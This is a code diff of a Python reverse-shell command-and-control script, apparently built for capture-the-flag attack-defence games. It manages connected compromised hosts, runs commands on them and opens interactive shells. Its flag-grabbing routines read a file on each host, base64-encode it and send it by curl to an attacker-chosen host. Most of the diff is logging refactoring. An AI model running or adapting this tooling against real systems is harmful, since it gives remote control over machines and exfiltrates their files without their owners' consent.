@@ -10,21 +10,24 @@ import os
 import readline
 import signal
 
-from utils import log
+from utils.log import Log
 
 slaves = {}
 
 EXIT_FLAG = False
 MAX_CONNECTION_NUMBER = 0x10
 
+
 def md5(data):
     return hashlib.md5(data).hexdigest()
+
 
 def recvuntil(p, target):
     data = ""
     while target not in data:
         data += p.recv(1)
     return data
+
 
 def recvall(socket_fd):
     data = ""
@@ -36,26 +39,28 @@ def recvall(socket_fd):
             break
     return data
 
+
 def slaver(host, port, fake):
     slaver_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     slaver_fd.connect((host, port))
     banner = "[FakeTerminal] >> "
     while True:
         if EXIT_FLAG:
-            print "[+] Slaver function exiting..."
+            Log.warning("Slaver function exiting...")
             break
         command = recvuntil(slaver_fd, "\n")
         if fake:
             slaver_fd.send(banner)
-        # print "[+] Executing : %r" % (command)
+        # Log.info("Executing : %r" % (command))
         try:
             result = os.popen(command).read()
         except:
             result = ""
         slaver_fd.send(command + result)
-    print "[+] Closing connection..."
+    Log.warning("Closing connection...")
     slaver_fd.shutdown(socket.SHUT_RDWR)
     slaver_fd.close()
+
 
 def transfer(h):
     slave = slaves[h]
@@ -64,22 +69,22 @@ def transfer(h):
     interactive_stat = True
     while True:
         if EXIT_FLAG:
-            print "[+] Transfer function exiting..."
+            Log.warning("Transfer function exiting...")
             break
         interactive_stat = slave.interactive
         buffer = socket_fd.recv(buffer_size)
         if not buffer:
-            print "[+] No data, breaking..."
+            Log.error("No data, breaking...")
             break
         sys.stdout.write(buffer)
-        print ""
         if not interactive_stat:
             break
     if interactive_stat:
-        print "[-] Unexpected EOF!"
+        Log.error("Unexpected EOF!")
         socket_fd.shutdown(socket.SHUT_RDWR)
         socket_fd.close()
         slave.remove_node()
+
 
 class Slave():
     def __init__(self, socket_fd):
@@ -87,18 +92,11 @@ class Slave():
         self.hostname, self.port = socket_fd.getpeername()
         self.node_hash = node_hash(self.hostname, self.port)
         self.interactive = False
-        # self.interactive_shell_thread = None
-        # self.banner = self.read_banner()
-        # slave_fd.shutdown(socket.SHUT_RDWR)
-        # slave_fd.close()
-
-    def read_banner(self):
-        return recvall(self.socket_fd)
 
     def show_info(self):
-        print "[+] Hash : %s" % (self.node_hash)
-        print "[+] IP : %s" % (self.hostname)
-        print "[+] Port : %s" % (self.port)
+        Log.info("Hash : %s" % (self.node_hash))
+        Log.info("IP : %s" % (self.hostname))
+        Log.info("Port : %s" % (self.port))
 
     def send_command(self, command):
         try:
@@ -111,20 +109,16 @@ class Slave():
     def send_command_print(self, command):
         self.send_command(command)
         time.sleep(0.125)
-        print "[+] Executing : %s" % (command)
         result = recvall(self.socket_fd)
-        print "[%s]" % ("-" * 32)
-        print result
+        Log.success(result)
 
     def interactive_shell(self):
         self.interactive = True
-        # if self.interactive_shell_thread == None:
         t = threading.Thread(target=transfer, args=(self.node_hash, ))
         t.start()
-        # self.interactive_shell_thread = t
         try:
             while True:
-                command = raw_input() or ("exit")
+                command = raw_input()
                 if command == "exit":
                     self.interactive = False
                     self.socket_fd.send("\n")
@@ -136,11 +130,12 @@ class Slave():
         time.sleep(0.125)
 
     def remove_node(self):
-        print "[+] Removing Node!"
+        Log.error("Removing Node!")
         slaves.pop(self.node_hash)
 
+
 def master(host, port):
-    print "[+] Master starting at %s:%d" % (host, port)
+    Log.info("Master starting at %s:%d" % (host, port))
     master_fd = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     master_fd.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
     master_fd.bind((host, port))
@@ -149,7 +144,7 @@ def master(host, port):
         if EXIT_FLAG:
             break
         slave_fd, slave_addr = master_fd.accept()
-        print "[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1])
+        Log.success("\r[+] Slave online : %s:%d" % (slave_addr[0], slave_addr[1]))
         repeat = False
         for i in slaves.keys():
             slave = slaves[i]
@@ -157,38 +152,38 @@ def master(host, port):
                 repeat = True
                 break
         if repeat:
-            print "[+] Detect the same host connection, reseting..."
+            Log.warning("Detect the same host connection, reseting...")
             slave_fd.shutdown(socket.SHUT_RDWR)
             slave_fd.close()
         else:
-            print "[+] New node add to online list..."
             slave = Slave(slave_fd)
             slaves[slave.node_hash] = slave
-    print "[+] Master exiting..."
+    Log.error("Master exiting...")
     master_fd.shutdown(socket.SHUT_RDWR)
     master_fd.close()
+
 
 def show_commands():
     print "Commands : "
     print "        0. [h|help|?|\\n] : show this help"
     print "        1. [l] : list all online slaves"
-    print "        2. [p] : print position info"
+    print "        2. [p] : log.info(position info"
     print "        3. [i] : interactive shell"
     print "        4. [g] : goto a slave"
-    print "        5. [ ] : port forwarding (Under developing...)"
-    print "        6. [gf] : get flag"
-    print "        7. [gaf] : get all flag"
-    print "        8. [c] : command for all"
-    print "        9. [q|quit|exit] : interact an shell"
+    print "        5. [gf] : get flag"
+    print "        6. [gaf] : get all flag"
+    print "        7. [c] : command for all"
+    print "        8. [setl] : set local execute"
+    print "        9. [setr] : set remote execute"
+    print "        10. [q|quit|exit] : interact an shell"
 
 def signal_handler(ignum, frame):
     print ""
     show_commands()
-    sys.stdout.write("=>")
-    sys.stdout.flush()
 
 def node_hash(host, port):
     return md5("%s:%d" % (host, port))
+
 
 def main():
     if len(sys.argv) != 3:
@@ -198,12 +193,14 @@ def main():
 
     host = sys.argv[1]
     port = int(sys.argv[2])
+    EXEC_LOCAL = True
 
     signal.signal(signal.SIGINT, signal_handler)
     signal.signal(signal.SIGTERM, signal_handler)
 
-    print "[+] Initing..."
+    Log.info("Starting server...")
     master_thread = threading.Thread(target=master, args=(host, port,))
+    Log.info("Connecting to localhost server...")
     slaver_thread = threading.Thread(target=slaver, args=(host, port, True,))
     master_thread.daemon = True
     slaver_thread.daemon = True
@@ -211,98 +208,118 @@ def main():
     slaver_thread.start()
     time.sleep(1)
     show_commands()
-    position = slaves[slaves.keys()[0]].node_hash # master himself
+    position = slaves[slaves.keys()[0]].node_hash  # master himself
     while True:
-        command = raw_input("=>") or "h"
+        context_hint = "[%s] >> " % (slaves[position].hostname)
+        Log.context(context_hint)
+        command = raw_input() or "h"
         if command.startswith("#"):
             continue
         if command == "h" or command == "help" or command == "?" or command == "\n":
             show_commands()
         elif command == "l":
-            print "[+] Listing online slaves..."
+            Log.info("Listing online slaves...")
             for key in slaves.keys():
-                print "[>>>> %s <<<<]" % (key)
+                print "[%s]" % ("-" * 0x2A)
                 slaves[key].show_info()
+            print "[%s]" % ("-" * 0x2A)
         elif command == "p":
             slaves[position].show_info()
         elif command == "c":
             command = raw_input("Input command (uname -r) : ") or ("uname -r")
+            Log.info("Command : %s" % (command))
             for i in slaves.keys():
                 slave = slaves[i]
-                print "[+] Command : %s" % (command)
                 result = slave.send_command_print(command)
         elif command == "g":
-            input_node_hash = raw_input("[+] Please input target node hash : ") or position
-            print "[+] Input node hash : %s" % (repr(input_node_hash))
+            input_node_hash = raw_input(
+                "Please input target node hash : ") or position
+            Log.info("Input node hash : %s" % (repr(input_node_hash)))
             if input_node_hash == position:
-                print "[+] Position will not change!"
+                Log.warning("Position will not change!")
                 continue
             found = False
             for key in slaves.keys():
                 if key.startswith(input_node_hash):
                     # old_slave = slaves[position]
                     new_slave = slaves[key]
-                    # print "[+] Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port)
-                    print "[+] Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port)
+                    # Log.info("Changing position from [%s:%d] to [%s:%d]" % (old_slave.hostname, old_slave.port, new_slave.hostname, new_slave.port))
+                    Log.info("Changing position to [%s:%d]" % (new_slave.hostname, new_slave.port))
                     position = key
                     found = True
                     break
             if not found:
-                print "[-] Please check your input node hash!"
-                print "[-] Position is not changed!"
+                Log.error("Please check your input node hash!")
+                Log.error("Position is not changed!")
+        elif command == "setl":
+            EXEC_LOCAL = True
+        elif command == "setr":
+            EXEC_LOCAL = False
         elif command == "fag":
-            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
-            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
+            flag_path = raw_input(
+                "Input flag path (/flag.txt) : ") or ("/flag.txt")
+            box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
+                "192.168.187.128")
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
             for i in slaves.keys():
                 slave = slaves[i]
                 command = "FLAG=`cat %s | base64`" % (flag_path)
-                print "[+] Command : %s" % (command)
+                Log.info("Command : %s" % (command))
                 result = slave.send_command(command)
-                command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
-                print "[+] Command : %s" % (command)
+                command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+                    box_host, box_port)
+                Log.info("Command : %s" % (command))
                 result = slave.send_command(command)
                 if result:
-                    print "[+] Flag is sent to you!"
+                    Log.info("Flag is sent to you!")
                 else:
                     # slave.remove_node()
-                    print "[-] Executing command failed! Connection aborted! Node removed!"
+                    Log.error("Executing command failed! Connection aborted! Node removed!")
                     position = slaves.keys()[0]
-                    print "[+] Position changed to : %s" % (position)
+                    Log.info("Position changed to : %s" % (position))
         elif command == "fg":
             slave = slaves[position]
-            flag_path = raw_input("Input flag path (/flag.txt) : ") or ("/flag.txt")
-            box_host = raw_input("Input flag box host (192.168.187.128) : ") or ("192.168.187.128")
+            flag_path = raw_input(
+                "Input flag path (/flag.txt) : ") or ("/flag.txt")
+            box_host = raw_input("Input flag box host (192.168.187.128) : ") or (
+                "192.168.187.128")
             box_port = int(raw_input("Input flag box host (80) : ") or ("80"))
             command = "FLAG=`cat %s | base64`" % (flag_path)
-            print "[+] Command : %s" % (command)
+            Log.info("Command : %s" % (command))
             result = slave.send_command(command)
-            command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (box_host, box_port)
-            print "[+] Command : %s" % (command)
+            command = "curl \"http://%s:%d/?flag=${FLAG}\"" % (
+                box_host, box_port)
+            Log.info("Command : %s" % (command))
             result = slave.send_command(command)
             if result:
-                print "[+] Flag is sent to you!"
+                Log.info("Flag is sent to you!")
             else:
                 # slave.remove_node()
-                print "[-] Executing command failed! Connection aborted! Node removed!"
+                Log.error("Executing command failed! Connection aborted! Node removed!")
                 position = slaves.keys()[0]
-                print "[+] Position changed to : %s" % (position)
+                Log.info("Position changed to : %s" % (position))
         elif command == "i":
             slave = slaves[position]
             slave.interactive_shell()
         elif command == "q" or command == "quit" or command == "exit":
             EXIT_FLAG = True
             # TODO : release all resources before closing
-            print "[+] Releasing resources..."
+            Log.info("Releasing resources...")
             for key in slaves.keys():
                 slave = slaves[key]
-                print "[+] Closing conntion of %s:%d" % (slave.hostname, slave.port)
+                Log.error("Closing conntion of %s:%d" % (slave.hostname, slave.port))
                 slave.socket_fd.shutdown(socket.SHUT_RDWR)
                 slave.socket_fd.close()
-            print "[+] Exiting..."
+            Log.error("Exiting...")
             exit(0)
         else:
-            print "[-] Please check your input!"
+            Log.error("Unsupported command!")
+            if EXEC_LOCAL:
+                os.system(command)
+            else:
+                slave = slaves[position]
+                slave.send_command_print(command)
+
 
 if __name__ == "__main__":
     main()
